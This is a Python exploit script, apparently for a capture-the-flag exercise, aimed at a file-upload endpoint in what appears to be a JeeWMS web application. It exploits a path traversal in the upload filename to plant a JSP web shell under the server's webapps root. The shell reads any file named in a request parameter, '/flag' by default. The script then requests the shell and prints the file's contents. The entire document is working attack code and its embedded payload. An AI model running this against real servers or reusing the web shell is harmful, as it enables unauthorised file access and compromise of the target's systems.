import argparse
import sys

try:
    import requests
except ImportError:
    print("requests is required: pip install requests", file=sys.stderr)
    sys.exit(1)


JSP_PAYLOAD = (
    "<%@ page import=\"java.io.*\" %>"
    "<%\n"
    "String p = request.getParameter(\"f\");\n"
    "if (p == null || p.isEmpty()) { p = \"/flag\"; }\n"
    "try {\n"
    "  FileInputStream fis = new FileInputStream(p);\n"
    "  byte[] buf = new byte[4096];\n"
    "  int n;\n"
    "  while ((n = fis.read(buf)) > 0) { out.write(new String(buf, 0, n)); }\n"
    "  fis.close();\n"
    "} catch (Exception e) { out.write(e.toString()); }\n"
    "%>"
)


def main():
    parser = argparse.ArgumentParser(description="filedeal upload path traversal exploit")
    parser.add_argument("--base-url", required=True, help="Base URL, e.g. http://host:port/jeewms")
    parser.add_argument(
        "--filename",
        required=True,
        help="Traversal filename to write, e.g. ../../webapps/ROOT/flag.jsp",
    )
    parser.add_argument("--shell-url", default=None, help="URL to the dropped JSP")
    parser.add_argument("--flag-path", default="/flag", help="File path to read on server")
    parser.add_argument("--cookie", default=None, help="Session cookie, e.g. JSESSIONID=...")
    parser.add_argument("--proxy", default=None, help="Proxy URL, e.g. http://127.0.0.1:8080")
    args = parser.parse_args()

    headers = {}
    if args.cookie:
        headers["Cookie"] = args.cookie

    proxies = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    upload_url = args.base_url.rstrip("/") + "/systemController/filedeal.do?isup=1"
    files = {"file": (args.filename, JSP_PAYLOAD, "application/octet-stream")}

    r = requests.post(upload_url, files=files, headers=headers, proxies=proxies, timeout=20)
    if r.status_code != 200:
        print("Upload failed:", r.status_code)
        print(r.text)
        sys.exit(1)

    if not args.shell_url:
        print("Upload done. Provide --shell-url to fetch the flag.")
        sys.exit(0)

    shell_url = args.shell_url
    if "?" in shell_url:
        url = shell_url + "&f=" + args.flag_path
    else:
        url = shell_url + "?f=" + args.flag_path

    r = requests.get(url, headers=headers, proxies=proxies, timeout=20)
    print(r.text)


if __name__ == "__main__":
    main()

